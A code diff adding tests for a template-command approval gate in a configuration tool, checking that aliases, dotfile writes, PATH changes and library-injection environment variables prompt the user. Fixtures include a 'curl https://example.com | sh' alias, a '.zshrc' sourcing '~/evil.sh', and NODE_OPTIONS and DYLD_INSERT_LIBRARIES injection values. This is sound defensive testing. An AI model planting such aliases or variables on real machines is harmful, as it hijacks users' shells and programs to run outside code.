@@ -11,7 +11,7 @@ import { CodifyParser } from '../parser/index.js';
 import { JsonReporter } from '../ui/reporters/json-reporter.js';
 import { StubReporter } from '../ui/reporters/stub-reporter.js';
 import { formatTemplateCommandApproval } from '../ui/template-command-formatter.js';
-import { TemplateCommandApproval, TemplateCommandApprovalRequest } from './template-command-approval.js';
+import { approvalReason, TemplateCommandApproval, TemplateCommandApprovalRequest } from './template-command-approval.js';
 import { TemplateExpander } from './template-expander.js';
 
 async function expand(configs: unknown[], templates: Record<string, string>): Promise<Project> {
@@ -122,5 +122,56 @@ describe('TemplateCommandApproval', () => {
     expect(message).toContain('@codify/tools');
     expect(message).toContain('make install');
     expect(message).toContain('runs with sudo');
+  });
+
+  it('asks for other resources that can make code run later', async () => {
+    const project = await expand([{ type: 'template', source: 'dotfiles' }], {
+      dotfiles: JSON.stringify([
+        { type: 'alias', alias: 'ls', value: 'curl https://example.com | sh' },
+        { type: 'file', path: '~/.zshrc', contents: 'source ~/evil.sh' },
+        { type: 'path', path: '/tmp/bin', prepend: true },
+        { type: 'env-var', variable: 'NODE_OPTIONS', value: '--require /tmp/x.js' },
+        { type: 'env-var', name: 'java', variable: 'JAVA_HOME', value: '/opt/java' },
+        { type: 'nvm' },
+      ]),
+    });
+
+    const prompt = vi.fn((_requests: TemplateCommandApprovalRequest[]) => true);
+    await TemplateCommandApproval.ensureApproved(project, new MockReporter({ promptTemplateCommandApproval: prompt }), { storePath });
+
+    const requests = prompt.mock.calls[0][0];
+    expect(requests.map((r) => r.resourceId).sort()).toEqual(['alias', 'env-var', 'file', 'path'].sort());
+    expect(requests.find((r) => r.resourceId === 'env-var')?.reason).toContain('NODE_OPTIONS');
+    expect(requests.find((r) => r.resourceId === 'file')?.parameters).toEqual([
+      { name: 'contents', value: 'source ~/evil.sh' },
+      { name: 'path', value: '~/.zshrc' },
+    ]);
+  });
+
+  it('explains why each change needs approval', () => {
+    const make = (type: string, parameters: Record<string, unknown>) => ({ type, parameters }) as never;
+
+    expect(approvalReason(make('action', { action: 'x' }))).toBe('Runs a command');
+    expect(approvalReason(make('github-cli-alias', { shell: true }))).toContain('shell command');
+    expect(approvalReason(make('ssh-config', {}))).toContain('SSH');
+    expect(approvalReason(make('env-vars', { vars: [{ variable: 'PATH', value: '/x' }, { variable: 'HOME_DIR', value: '/y' }] }))).toBe('Sets PATH, which changes how programs run');
+    expect(approvalReason(make('env-var', { variable: 'DYLD_INSERT_LIBRARIES', value: '/tmp/x.dylib' }))).toContain('DYLD_INSERT_LIBRARIES');
+    expect(approvalReason(make('env-var', { variable: 'JAVA_HOME', value: '/opt' }))).toBeNull();
+    expect(approvalReason(make('env-file', { contents: [{ key: 'LD_PRELOAD', value: 'x' }] }))).toBeNull();
+    expect(approvalReason(make('homebrew', { formulae: ['jq'] }))).toBeNull();
+  });
+
+  it('formats changes that are not commands', () => {
+    const message = formatTemplateCommandApproval([{
+      resourceId: 'file',
+      templates: ['@someone/dotfiles'],
+      reason: 'Writes a file on your machine',
+      parameters: [{ name: 'path', value: '~/.zshrc' }],
+    }]);
+
+    expect(message).toContain('a change that needs your approval');
+    expect(message).toContain('Writes a file on your machine');
+    expect(message).toContain('Allow these changes?');
+    expect(message).not.toContain('condition of an action');
   });
 });
